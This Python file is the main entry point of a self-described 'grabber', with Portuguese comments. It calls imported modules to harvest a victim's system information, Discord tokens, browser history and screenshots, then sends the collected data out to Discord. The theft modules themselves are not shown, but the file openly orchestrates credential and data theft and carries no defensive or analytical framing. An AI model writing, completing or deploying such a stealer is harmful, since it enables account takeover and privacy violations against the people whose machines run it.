from modules.system_info import get_system_info
from modules.discord_token import get_discord_token
from modules.browser_history import get_browser_history
from modules.screenshot import take_screenshot
from modules.discord_sender import send_to_discord

def main():
    # Configurações fixas (embutidas no código)
    settings = {
        "collect_system_info": True,
        "collect_discord_token": True,
        "collect_browser_history": True,
        "collect_screenshot": True,
        "save_screenshot_locally": False
    }
    print(f"[INFO] Iniciando o grabber com configurações: {settings}")
    
    # Inicializar dados a serem enviados
    data = {}
    
    # Coletar dados conforme configurações
    if settings.get("collect_system_info", False):
        print("[INFO] Coletando informações do sistema...")
        try:
            data["system_info"] = get_system_info()
            print(f"[INFO] Informações do sistema coletadas: {data['system_info']}")
        except Exception as e:
            print(f"[ERRO] Falha ao coletar informações do sistema: {e}")
    
    if settings.get("collect_discord_token", False):
        print("[INFO] Coletando tokens do Discord...")
        try:
            data["discord_token"] = get_discord_token()
            print(f"[INFO] Tokens do Discord coletados: {data['discord_token']}")
        except Exception as e:
            print(f"[ERRO] Falha ao coletar tokens do Discord: {e}")
    
    if settings.get("collect_browser_history", False):
        print("[INFO] Coletando histórico do navegador...")
        try:
            data["browser_history"] = get_browser_history()
            print(f"[INFO] Histórico do navegador coletado: {data['browser_history']}")
        except Exception as e:
            print(f"[ERRO] Falha ao coletar histórico do navegador: {e}")
    
    if settings.get("collect_screenshot", False):
        print("[INFO] Capturando tela...")
        save_locally = settings.get("save_screenshot_locally", False)
        try:
            data["screenshot"] = take_screenshot(save_locally=save_locally)
            print(f"[INFO] Captura de tela realizada (salva localmente: {save_locally})")
        except Exception as e:
            print(f"[ERRO] Falha ao capturar tela: {e}")
    
    # Enviar dados ao Discord
    if data:
        print("[INFO] Enviando dados ao Discord...")
        try:
            send_to_discord(data)
            print("[INFO] Dados enviados ao Discord com sucesso.")
        except Exception as e:
            print(f"[ERRO] Falha ao enviar dados ao Discord: {e}")
    else:
        print("[AVISO] Nenhum dado configurado para coleta.")

if __name__ == "__main__":
    main()